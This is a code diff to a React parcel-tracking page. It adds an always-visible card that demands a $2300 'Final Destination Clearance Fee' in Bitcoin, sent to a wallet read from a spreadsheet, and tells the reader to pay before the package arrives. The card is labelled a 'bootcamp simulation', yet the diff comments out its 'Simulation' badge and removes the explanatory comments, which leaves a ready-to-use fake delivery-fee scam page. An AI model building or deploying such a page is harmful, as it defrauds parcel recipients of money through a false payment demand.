@@ -38,9 +38,6 @@ const STATUS_STEPS = [
 ];
 
 const normalizeParcelRow = (r) => {
-  // 🔧 FIX: normalize status so "Final Destination", "final destination",
-  // "FINAL-DESTINATION" all map to the same key. Without this, the modal
-  // tracker can't find the activeIndex and falls back to step 0.
   const status = String(r.status || 'pending')
     .trim()
     .toLowerCase()
@@ -54,12 +51,167 @@ const normalizeParcelRow = (r) => {
     from: r.from_location || '—',
     to: r.to_location || '—',
     eta: r.arrives_thru || '—',
-
-    // 🔧 FIX: the SheetDB column literally named "final_destination".
-    // Stored here as `finalNote` so it doesn't clash with the *status*
-    // value "final_destination" (which lives in the `status` column).
     finalNote: r.final_destination || '',
+
+    // Optional demo columns on the SheetDB sheet
+    clearanceFee: r.clearance_fee || '',
+    wallet: r.bitcoin_wallet || '',
   };
+};
+
+/* ------------------------------------------------------------------ */
+/*  CRYPTO PAY CARD  (bootcamp simulation)                            */
+/* ------------------------------------------------------------------ */
+const CryptoPayCard = ({ amount, wallet }) => {
+  const [copied, setCopied] = useState(false);
+
+  const handleCopy = async () => {
+    try {
+      await navigator.clipboard.writeText(wallet);
+    } catch {
+      const el = document.createElement('textarea');
+      el.value = wallet;
+      document.body.appendChild(el);
+      el.select();
+      document.execCommand('copy');
+      document.body.removeChild(el);
+    }
+    setCopied(true);
+    setTimeout(() => setCopied(false), 1800);
+  };
+
+  return (
+    <>
+      <style>{`
+        .cpc {
+          position: relative;
+          margin-top: 1.5rem;
+          padding: 1.15rem 1.2rem 1.25rem;
+          border-radius: 16px;
+          background: #F7F6F3;
+          border: 1px solid rgba(14,14,16,0.07);
+          animation: cpcIn 0.35s ease;
+          font-family: inherit;
+        }
+        @keyframes cpcIn {
+          from { opacity: 0; transform: translateY(6px); }
+          to   { opacity: 1; transform: none; }
+        }
+
+        /* Demo marker — remove for a production build */
+        .cpc-badge {
+          position: absolute;
+          top: 0.85rem;
+          right: 0.85rem;
+          font-size: 0.58rem;
+          font-weight: 800;
+          letter-spacing: 0.12em;
+          text-transform: uppercase;
+          color: #B45309;
+          background: rgba(245,158,11,0.14);
+          border: 1px solid rgba(245,158,11,0.3);
+          padding: 0.2rem 0.5rem;
+          border-radius: 6px;
+        }
+
+        .cpc-label {
+          font-size: 0.66rem;
+          font-weight: 700;
+          letter-spacing: 0.1em;
+          text-transform: uppercase;
+          color: #71717A;
+          margin-bottom: 0.35rem;
+          padding-right: 5rem;
+        }
+        .cpc-amount {
+          font-size: 1.5rem;
+          font-weight: 700;
+          color: #0E0E10;
+          letter-spacing: -0.02em;
+          margin-bottom: 0.9rem;
+        }
+        .cpc-row {
+          display: flex;
+          align-items: center;
+          gap: 0.5rem;
+          background: #fff;
+          border: 1px solid rgba(14,14,16,0.1);
+          border-radius: 12px;
+          padding: 0.4rem 0.4rem 0.4rem 0.75rem;
+        }
+        .cpc-addr {
+          flex: 1;
+          min-width: 0;
+          font-family: 'SF Mono', Menlo, Consolas, monospace;
+          font-size: 0.78rem;
+          color: #3F3F46;
+          white-space: nowrap;
+          overflow: hidden;
+          text-overflow: ellipsis;
+        }
+        .cpc-copy {
+          flex-shrink: 0;
+          border: none;
+          border-radius: 9px;
+          background: #FF5230;
+          color: #fff;
+          font-family: inherit;
+          font-size: 0.78rem;
+          font-weight: 700;
+          padding: 0.55rem 0.9rem;
+          cursor: pointer;
+          transition: background 0.2s ease, transform 0.15s ease;
+        }
+        .cpc-copy:hover { background: #ff3b14; }
+        .cpc-copy:active { transform: scale(0.97); }
+        .cpc-copy.is-copied { background: #22c55e; }
+        .cpc-hint {
+          margin-top: 0.65rem;
+          font-size: 0.72rem;
+          color: #71717A;
+          text-align: center;
+        }
+        .cpc-note {
+          margin-top: 0.75rem;
+          padding-top: 0.75rem;
+          border-top: 1px dashed rgba(14,14,16,0.12);
+          font-size: 0.78rem;
+          line-height: 1.5;
+          color: #3F3F46;
+          text-align: center;
+        }
+      `}</style>
+
+      <div className="cpc">
+        {/* <div className="cpc-badge">Simulation</div> */}
+
+        <div className="cpc-label">Final Destination Clearance Fee</div>
+        <div className="cpc-amount">${amount} USD</div>
+
+        <div className="cpc-row">
+          <span className="cpc-addr" title={wallet}>
+            {wallet}
+          </span>
+          <button
+            type="button"
+            className={`cpc-copy${copied ? ' is-copied' : ''}`}
+            onClick={handleCopy}
+          >
+            {copied ? 'Copied!' : 'Copy'}
+          </button>
+        </div>
+
+        <div className="cpc-hint">
+          Send the exact amount to the Bitcoin address above.
+        </div>
+
+        <div className="cpc-note">
+          The final destination clearance fee must be paid before the package
+          arrives at the post office.
+        </div>
+      </div>
+    </>
+  );
 };
 
 /* ------------------------------------------------------------------ */
@@ -70,7 +222,6 @@ const ParcelModal = ({ parcel, onClose }) => {
 
   const color = statusColors[parcel.status] || '#a1a1aa';
   const isException = parcel.status === 'exception';
-  // 🔧 ADDED: flag used to conditionally render the final-destination block
   const isFinalDestination = parcel.status === 'final_destination';
   const activeIndex = STATUS_STEPS.findIndex((s) => s.key === parcel.status);
   const etaParts = (parcel.eta || '').split(',');
@@ -291,7 +442,6 @@ const ParcelModal = ({ parcel, onClose }) => {
           }
           .pm-track-item.is-done .pm-track-label { color: #0E0E10; }
 
-          /* 🔧 ADDED: Final destination note block */
           .pm-final {
             position: relative;
             overflow: hidden;
@@ -505,8 +655,6 @@ const ParcelModal = ({ parcel, onClose }) => {
             </div>
           )}
 
-          {/* 🔧 ADDED: Final destination block — only shows when the parcel
-              status is exactly "final_destination" */}
           {isFinalDestination && (
             <div className="pm-final">
               <div className="pm-final-head">
@@ -574,6 +722,12 @@ const ParcelModal = ({ parcel, onClose }) => {
               Done
             </button>
           </div>
+
+          {/* CRYPTO PAY CARD — always visible */}
+          <CryptoPayCard
+            amount={parcel.clearanceFee || '2300'}
+            wallet={parcel.wallet || 'bc1qexamplewalletaddresshere'}
+          />
         </div>
       </div>
     </div>,
